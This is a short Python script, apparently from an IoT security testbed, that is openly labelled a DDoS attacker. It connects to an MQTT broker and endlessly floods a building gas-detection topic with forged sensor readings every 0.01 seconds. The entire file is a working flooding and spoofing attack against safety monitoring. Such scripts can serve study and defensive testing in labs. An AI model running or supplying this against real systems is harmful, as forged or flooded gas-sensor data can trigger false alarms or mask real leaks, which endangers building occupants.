# attacker_ddos.py
import os
import time
import json
import random
import paho.mqtt.client as mqtt

BROKER = os.getenv("BROKER_ADDRESS", "mqtt-broker")
TARGET_TOPIC = os.getenv("TARGET_TOPIC", "building/zone3/gas/detection")
ATTACK_RATE = float(os.getenv("ATTACK_RATE", 0.01))  # seconds between messages

client = mqtt.Client()
client.connect(BROKER)
print(f"[DDoS Attacker] 🔥 Connected to MQTT broker at {BROKER}")

def generate_fake_payload():
    return {
        "sensor": "gas",
        "value": random.uniform(0, 1000),
        "timestamp": time.time()
    }

while True:
    payload = json.dumps(generate_fake_payload())
    client.publish(TARGET_TOPIC, payload)
    print(f"[DDoS] Flooded: {payload}")
    time.sleep(ATTACK_RATE)
